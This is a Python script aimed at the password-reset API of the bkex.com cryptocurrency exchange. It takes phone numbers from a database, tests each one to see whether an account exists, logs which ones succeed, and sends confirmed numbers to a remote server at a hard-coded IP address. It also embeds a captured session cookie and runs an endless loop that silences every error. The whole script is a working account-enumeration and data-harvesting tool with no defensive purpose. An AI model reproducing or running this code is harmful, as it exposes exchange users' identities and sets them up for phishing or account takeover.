# coding:utf-8
import requests
from number_mongo import number_BaFangZiYuan


def check_number(number):
    headers = {'Host': 'www.bkex.com', 'Connection': 'keep-alive', 'Content-Length': '86', 'Pragma': 'no-cache',
               'Cache-Control': 'no-cache', 'Origin': 'https://www.bkex.com', 'Authorization': '',
               'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
               'Accept': 'application/json, text/javascript, */*; q=0.01',
               'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36',
               'X-Requested-With': 'XMLHttpRequest', 'Referer': 'https://www.bkex.com/',
               'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'zh-CN,zh;q=0.9',
               'Cookie': '__cdnuid=488e83d82c26bb3bdc38235593fa849e; __lnkrntdmcvrd=-1; _9755xjdesxxd_=32; gdxidpyhxdE=G9jdDU3qoqL65CyuuY%5CKe%5CiWLN8akBb%2BcmmlnyVnDMbL9%2FsrPJkML%2BZPQ5dNe%2B6k2NSSnT82gb9CVGeYL1YtfgruUAuypr%2BVbct7lIrXDSE%2Ft1qoLAKxoZ9qXRy6ALQpbG%2BkaXyc%2F60K%2FpjJ15R7eobIq9EpPqgrEuUfDKTTh%2FmqJb5a%3A1529725244467; SERVERID=87a52f6840ebb4e314d7e5811181a48f|1529724369|1529724304'}
    url = "https://www.bkex.com/api/users/resetPassword"
    form_data = [('telCountryCode', +86),
                 ('phone', ''),
                 ('email', ''),
                 ('phoneCode', ''),
                 ('captcha', ""),
                 ('emailCode', ''),
                 ('username', int(number)),
                 ]
    page = requests.post(url, headers=headers, data=form_data).text
    return page


def save_success_number(number):
    with open("success_币客.txt", "a+")as f:
        f.write(str(number) + "\n")


def save_faile_number(number):
    with open("faile_币客.txt", "a+")as f:
        f.write(str(number) + "\n")


def save(number):
    url ="http://122.114.183.102:8080/saveNumber/{0}/".format(number,)
    print(requests.get(url).text)


if __name__ == "__main__":

    count = 0
    while True:
        try:
            with open("flag_币客.txt")as f:
                count = int(f.read())
                print(count)
            for res in number_BaFangZiYuan.find({'_id': count}):
                line = res["number"].replace("\n", "")
                print(line, count)
                count += 1
                result = check_number(line)
                print(result)
                if str(result).find("请输入手机验证码") != -1:
                    save_success_number(number=line)
                    save(number=line)
                else:
                    save_faile_number(number=line)
            with open("flag_币客.txt", "w")as f:
                f.write(str(count))
        except:
            pass
# if __name__ == "__main__":
#     count = 0
#     with open("data7.txt")as f:
#         while True:
#             res = f.readline()
#             if not res:
#                 break
#             line = res[2:].replace("\n", "")
#             print(line, count)
#             count += 1
#             result = check_number(line)
#             print(result)
#             if str(result).find("请输入手机验证码") != -1:
#                 save_success_number(number=line)
#             else:
#                 save_faile_number(number=line)
# {"msg":"请输入手机验证码","code":-2,"data":null}
